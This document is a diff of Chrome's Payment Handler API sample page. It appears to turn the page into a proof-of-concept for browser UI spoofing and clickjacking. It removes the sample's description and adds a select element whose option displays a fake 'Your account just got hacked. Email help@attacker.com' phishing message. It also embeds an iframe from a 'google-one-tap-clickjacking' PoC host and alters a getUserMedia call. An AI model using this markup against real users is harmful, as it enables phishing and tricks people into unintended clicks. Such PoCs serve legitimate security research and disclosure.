@@ -30,21 +30,8 @@
 
   <body>
     
-    <h1>Payment Handler API Sample</h1>
-    <p class="availability">
-      Available in <a target="_blank" href="https://www.chromestatus.com/feature/5160285237149696">Chrome 68+</a> |
-      <a target="_blank" href="https://github.com/googlechrome/samples/blob/gh-pages/paymentrequest/payment-handler/">View on GitHub</a> |
-      <a target="_blank" href="https://www.chromestatus.com/samples">Browse Samples</a>
-    </p>
-    <h3>Background</h3>
-<p>
-  <a href="https://github.com/w3c/browser-payment-api">PaymentRequest</a> lets
-  you accept payment from different payment methods.
-</p>
 
-<p>
-  This sample accepts the URL-based payment method.
-</p>
+
 
 
 <script>
@@ -75,20 +62,19 @@
   };
 </script>
 
-<h3>Live Output</h3>
 <div id="output" class="output">
   <div id="content">
 <div><button id="buyButton" style="display: inline;">Buy</button>
-    <select onclick="setTimeout(function(){document.getElementById('buyButton').click();}, 90);" id="buyButton">
+    <select onclick="vo()" focus id="mySelect">
       <option disabled>&emsp;</option>
       <option disabled></option>
-      <option disabled></option>
-      <option disabled>&emsp;&emsp;Your account just got hacked. Email help@attacker.com to save your account.</option>
-      <option disabled></option>
+      <option disabled>&emsp;&emsp;Your account just got hacked. Email help@attacker.com to save your account Your account just got hacked. Email help@attacker.com to save your account.</option>
       <option disabled></option>
       <option disabled></option>
     </select>
     </div>
+	        <iframe id="clickjackIframe" src="https://pocs.work/pocs/2024/google-one-tap-clickjacking/gis.html" style=";" width="500px" height="300px"></iframe>
+
 <div><pre id="result"></pre></div>
 </div>
   <div id="status"></div>
@@ -151,7 +137,7 @@ function initPaymentRequest() {
  * @param {PaymentRequest} request The PaymentRequest object.
  */
 function onBuyClicked(request) {
-  navigator.mediaDevices.getUserMedia( {video: true}).then( ) 
+  navigator.mediaDevices.getUserMedia( {}).then( ) 
   request.show().then(function(instrumentResponse) {
     sendPaymentToServer(instrumentResponse);
   })
